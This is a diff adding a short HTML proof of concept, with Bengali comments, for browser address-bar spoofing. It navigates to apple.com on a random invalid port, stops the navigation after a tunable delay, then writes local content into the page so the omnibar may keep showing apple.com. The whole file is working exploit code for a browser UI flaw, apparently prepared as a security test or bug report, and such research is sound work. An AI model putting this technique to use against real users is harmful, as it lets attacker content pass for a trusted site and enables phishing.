@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dynamic Navigation Spoof (Apple Target)</title>
+</head>
+<body>
+    <h1>Port Confusion & Navigation Stop Test</h1>
+    <button onclick="launchAppleSpoof()">Execute Apple.com Spoof</button>
+
+    <script>
+    function launchAppleSpoof() {
+        // ১. একটি র্যান্ডম পোর্ট জেনারেট করা (যা স্ট্যান্ডার্ড HTTP/HTTPS নয়)
+        let invalidPort;
+        do {
+            invalidPort = Math.floor(Math.random() * 900) + 100; // e.g., 554, 888
+        } while (invalidPort === 80 || invalidPort === 443);
+
+        // ২. সরাসরি apple.com এর ইনভ্যালিড পোর্টে লোকেশন সেট করা
+        document.location = "https://apple.com:" + invalidPort + "/";
+
+        // ৩. ঠিক ব্রাউজারের UI থ্রেড নেভিগেশন রেজিস্টার করার মুহূর্তে এক্সিকিউশন স্টপ করা
+        setTimeout(() => {
+            window.stop(); // এই কমান্ডটি নেভিগেশন ক্যানসেল করে কিন্তু UI স্টেটকে ঝুলিয়ে রাখে
+            
+            // ৪. এখন কারেন্ট ডকুমেন্টে ফেক কনটেন্ট ওভাররাইট করা
+            document.open();
+            document.write(`
+                <body style="font-family:sans-serif; text-align:center; padding-top:100px; background:#f2f2f2;">
+                    <h1 style="color:#d32f2f;">Security Notice</h1>
+                    <p>This content is locally injected, but the omnibar might be stuck on Apple.com.</p>
+                </body>
+            `);
+            document.close();
+        }, 280); // আপনার ব্রাউজারের ল্যাগ অনুযায়ী টাইমিং ২০০ms থেকে ৪০০ms টিউন করতে পারেন
+    }
+    </script>
+</body>
+</html>
